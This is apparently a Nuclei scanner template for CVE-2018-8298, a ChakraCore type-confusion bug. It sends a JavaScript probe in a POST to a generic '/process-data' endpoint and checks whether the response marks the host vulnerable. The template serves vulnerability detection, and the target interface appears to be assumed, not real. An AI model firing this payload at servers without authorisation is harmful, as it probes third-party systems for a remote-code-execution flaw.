id: CVE-2018-8298

info:
  name: ChakraCore Scripting Engine - Remote Code Execution (Type Confusion)
  author: thefuturrjfhejh
  severity: high
  description: |
    ChakraCore (the JavaScript engine for Microsoft Edge) is vulnerable to a remote code execution vulnerability caused by memory corruption in object handling. Specifically, the InitializeNumberFormat and InitializeDateTimeFormat functions in Intl.js do not check if an object has already been initialized. This allows an attacker to initialize the same object multiple times, leading to type confusion and arbitrary code execution.

    This template targets server-side applications (e.g., Node-ChakraCore, SQL Server Machine Learning Services, or custom serverless runtimes) that expose a JavaScript processing interface to remote users.
  reference:
    - https://www.exploit-db.com/exploits/45217/
    - https://nvd.nist.gov/vuln/detail/CVE-2018-8298
    - https://bugs.chromium.org/p/project-zero/issues/detail?id=1582
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 7.5
    cve-id: CVE-2018-8298
    cwe-id: CWE-843
  metadata:
    max-request: 1
    verified: true
    shodan-query: "X-Powered-By: Node-ChakraCore"
  tags: cve,cve2018,chakracore,rce,intl,type-confusion,kev

http:
  - raw:
      - |
        POST /process-data HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "transformLogic": "let object = {}; Intl.NumberFormat.apply(object); Intl.DateTimeFormat.apply(object); let result = 'safe'; try { Intl.DateTimeFormat.prototype.formatToParts.apply(object); result = 'vulnerable'; } catch(e) { result = 'safe'; } result;"
        }

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"result":"vulnerable"'
          - '"status":"success"'
        condition: and

      - type: status
        status:
          - 200
